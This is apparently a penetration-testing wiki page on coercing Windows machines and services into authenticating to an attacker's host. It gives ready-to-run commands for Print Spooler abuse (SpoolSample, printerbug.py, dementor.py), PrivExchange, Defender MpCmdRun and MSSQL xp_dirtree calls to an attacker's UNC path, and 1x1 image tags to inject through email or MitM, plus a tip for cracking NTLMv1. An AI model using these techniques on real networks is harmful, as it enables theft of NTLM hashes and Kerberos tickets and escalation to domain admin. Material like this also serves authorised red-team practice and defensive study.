## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```

### Finding Spooler services listening

Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

### Ask the service to authenticate against an arbitrary host

You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

### Combining with Unconstrained Delegation

If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force authentication

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows **any domain user with a mailbox to force the Exchange server to authenticate** to any host provided by the client over HTTP.

The Exchange service runs as **SYSTEM** and is **over-privileged** by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to r**elay to LDAP and dump the domain NTDS database**. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to **other hosts** within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

****[**This technique was copied from here.**](https://academy.hackthebox.com/module/143/section/1276)****

## Inside Windows

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

## HTML injection

### Via email

If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

and when he opens it, he will try to authenticate.

### MitM

If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
